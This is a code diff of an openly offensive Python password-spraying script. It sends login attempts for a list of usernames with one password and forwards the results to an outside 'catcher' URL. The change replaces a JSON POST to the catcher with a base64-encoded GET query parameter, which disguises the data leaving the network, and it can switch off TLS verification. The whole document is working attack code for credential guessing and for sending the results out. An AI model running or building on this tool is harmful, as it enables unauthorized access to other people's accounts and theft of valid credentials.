@@ -1,11 +1,12 @@
 # default sprayer but using proxcy
 import requests
 import os
+import json
+import base64
 from urllib3.exceptions import InsecureRequestWarning
 
 required_env_vars = ["USERNAMES", "PASSWORD", "CATCHERURL", "CATCHERTLS"]
 missing_env_vars = [var for var in required_env_vars if os.getenv(var) is None]
-
 if missing_env_vars:
     missing_vars_str = ", ".join(missing_env_vars)
     raise ValueError(f"Missing environment variables: {missing_vars_str}")
@@ -16,6 +17,7 @@ usernames = os.getenv("USERNAMES").split(',')
 password = os.getenv("PASSWORD")
 catcher_URL = os.getenv("CATCHERURL")
 catcher_uses_TLS_str = os.getenv("CATCHERTLS")
+
 # Convert catcher_uses_TLS_str to boolean
 catcher_uses_TLS = catcher_uses_TLS_str.lower() == "true"
 
@@ -35,7 +37,6 @@ def send_login_request(username, password):
         "Content-Type": "application/x-www-form-urlencoded",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36.",
     }
-
     try:
         response = requests.post(
             url,
@@ -45,15 +46,26 @@ def send_login_request(username, password):
             timeout=5,
         )
         return response.status_code, response.text
-
     except requests.RequestException:
         return None, None
 
 def send_data_to_catcher(data, use_ssl):
     if not use_ssl:
         requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+    
     try:
-        response = requests.post(catcher_URL, json=data, timeout=3, verify=use_ssl)
+        # Converte os dados para JSON string
+        json_data = json.dumps(data)
+        
+        # Codifica em base64
+        encoded_data = base64.b64encode(json_data.encode('utf-8')).decode('utf-8')
+        
+        # Monta a URL com o parâmetro
+        url_with_params = f"{catcher_URL}?encoded={encoded_data}"
+        
+        # Envia via GET
+        response = requests.get(url_with_params, timeout=3, verify=use_ssl)
+        
         print("[+] Data sent to the catcher.")
     except requests.RequestException:
         print(f"[-] Failed to send data to the catcher.")
